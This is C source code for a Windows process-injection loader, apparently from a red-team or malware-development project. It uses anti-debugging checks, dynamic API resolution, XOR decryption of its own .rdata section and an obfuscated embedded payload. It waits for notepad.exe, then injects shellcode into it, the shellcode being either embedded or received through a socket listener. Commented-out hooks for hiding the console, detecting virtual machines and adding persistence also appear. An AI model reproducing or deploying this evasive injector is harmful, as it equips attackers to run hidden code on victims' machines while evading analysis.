#include <Windows.h>
#include <stdio.h>
#include "payload.h"
#include "config.h"
#include <time.h>
#include "low-entropy-payload.h"
//#include "VM-detect.h"
#include "debugger-detect.h"
BOOL IsDuplicate()
{
    DWORD currentpid = GetCurrentProcessId();
    char filepath[MAX_PATH];
    GetModuleFileNameA(NULL, filepath, MAX_PATH);

    char *filename = strrchr(filepath, '\\');
    if (filename) {
        filename++;  // Move past the last backslash
    } else {
        filename = filepath;  // No backslash found, the path is the filename
    }

    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD pid = 0;
    // Take a snapshot of all processes in the system
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);
    // Retrieve information about the first process
    Process32First(hProcessSnap, &pe32);
    // Iterate through the processes to find the one with the specified name

    HANDLE kernel32 = getModuleByName(aKernel32dll);
    pOpenProcess _OpenProcess = (pOpenProcess) getFuncByName(kernel32, aOpenProcess);
    pCloseHandle _CloseHandle = getFuncByName(kernel32, aCloseHandle);
    do {
        if (strcmp(pe32.szExeFile, filename) == 0) {
            if (pe32.th32ProcessID != currentpid){
                char tmp[MAX_PATH];
                HANDLE hProc = _OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProc==NULL) continue;
                GetModuleFileNameA(hProc, tmp, MAX_PATH);
                if (filepath == tmp){
                    #ifdef DEBUG
                    printf("[+] Duplicate process found, quitting!\n");
                    #endif
                    _CloseHandle(hProc);
                    return TRUE;
                }
                _CloseHandle(hProc);
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));
    return FALSE;
}

void DecryptRDataSection()
{
    LPVOID procbase = GetModuleHandleA(NULL);
    DWORD signature = 0xaabbccdd;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)procbase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((char *) procbase + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER currentSection = IMAGE_FIRST_SECTION(ntHeaders);
    for(int i =0 ; i < ntHeaders->FileHeader.NumberOfSections; ++i)
    {
        if (*((DWORD64*) currentSection->Name) == 0x61746164722e){
            // printf("found\n");
            break;
        }   
        ++currentSection;
    }
    
    int sectionSize = currentSection->Misc.VirtualSize; 
    DWORD * addr = (DWORD *)((char*) procbase + currentSection->VirtualAddress);
    DWORD oldProtect = PAGE_READONLY;
    VirtualProtect(addr, sectionSize, PAGE_READWRITE, &oldProtect);
        // printf("Worked\n");
    // printf("decrypting\n");
    for(int i = 0; i < 0xa00; i += 4)
    {
        *addr ^= signature;
        ++addr;
    }
    oldProtect = PAGE_READWRITE;
    //VirtualProtect(addr, sectionSize, PAGE_READONLY, &oldProtect);
}

int BUFFER_Size = 205;

void RemoveEntropy()
{
    for (int i = 0; i < BUFFER_Size; i++)
        embeded_payload[i] = embeded_payload[i] ^ (embeded_payload[i + BUFFER_Size] << 4);
}

int main()
{
    
    //HWND window = GetConsoleWindow();
    //ShowWindow(window, SW_HIDE);

    //DecryptRDataSection();

    if (IsDuplicate()) { 
        exit(0); 
    }
    
    srand((int)time(0));

    // #ifdef DEBUG
    // char logpath[MAX_PATH];
    // GetCurrentProcessDirectory(logpath, MAX_PATH);
    // strcpy(logpath + strlen(logpath), "\\log.txt");
    // // printf("%s\n", logpath);
    // freopen(logpath, "w", stdout);
    // #endif
    //if (Debugger)
    // if (VMDetect())
    // {
    //     #ifdef DEBUG
    //     printf("[x] VM detected! Operation abort!\n");
    //     #endif // DEBUG
    //     exit(0);
    // }
    // else
    // {
    //     #ifdef DEBUG
    //     printf("[+] VM has not been detected! Operation continue!\n");
    //     #endif
    // }

    if (CheckDebugPresentBit() || CheckNTGlobalFlag())
    {
#ifdef DEBUG
        printf("[x] Debugger has been detected, operation abort!\n");
        exit(0);
#endif
    }
    else
    {
#ifdef DEBUG
        printf("[+] No debugger has been detected, operation continue!\n");
#endif
    }

    #ifdef DEBUG
    printf("[.] Waiting for notepad.exe\n");
    #endif

    DWORD targetpid = 0;

    //printf("Enter target pid: ");
    //scanf("%ud", &targetpid);
    while (targetpid == 0)
    {
        Sleep(500);
        targetpid = FindPIDByName(L"notepad.exe");
    }
    #ifdef DEBUG
    printf("[+] Target pid: %d\n", targetpid);
    #endif
    

    unsigned char * payload;
    
    unsigned char * key;
    int keylen;

    // RunEdit(); /// add persistence

    #ifdef PAYLOAD_EMBED    // spawn calc.exe
    payload = embeded_payload;
    //RemoveEntropy();      //deobfuscate payload
    #else
    SOCKET pSocket;
    Listenner(&pSocket);
    PayloadReceive(&pSocket, &buffer, &bufferlen, &key, &keylen);
    //Decrypt(buffer, bufferlen, key, keylen);
    #endif


    HANDLE kernel32 = getModuleByName(aKernel32dll);
    pOpenProcess _OpenProcess = (pOpenProcess) getFuncByName(kernel32, aOpenProcess);
    HANDLE hProcess = _OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetpid);
    if (hProcess)
    {
        InjectPayload(hProcess, payload , BUFFER_Size);
    }
    else
    {
        #ifdef DEBUG
        printf("[x] Fail to open process!\n");
        #endif // DEBUG
        return -1;
    }
    pCloseHandle _CloseHandle = getFuncByName(kernel32, aCloseHandle);
    _CloseHandle(hProcess);
    return 0;
}